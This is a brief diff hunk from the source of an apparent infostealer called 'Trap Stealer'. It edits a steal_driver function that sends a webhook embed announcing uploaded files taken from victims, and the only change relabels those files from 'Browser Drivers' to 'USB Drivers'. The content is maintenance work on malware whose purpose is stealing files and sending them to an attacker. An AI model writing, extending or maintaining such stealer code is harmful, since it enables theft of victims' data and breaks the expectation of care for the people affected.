@@ -434,7 +434,7 @@ def steal_driver():
                 "embeds": [
                     {
                         "title": "🍪 Trap Stealer USB Drivers",
-                        "description": f"Browser Drivers Files\n{upload}",
+                        "description": f"USB Drivers Files\n{upload}",
                         "color": 0xffb6c1,
                         "thumbnail": {
                             "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
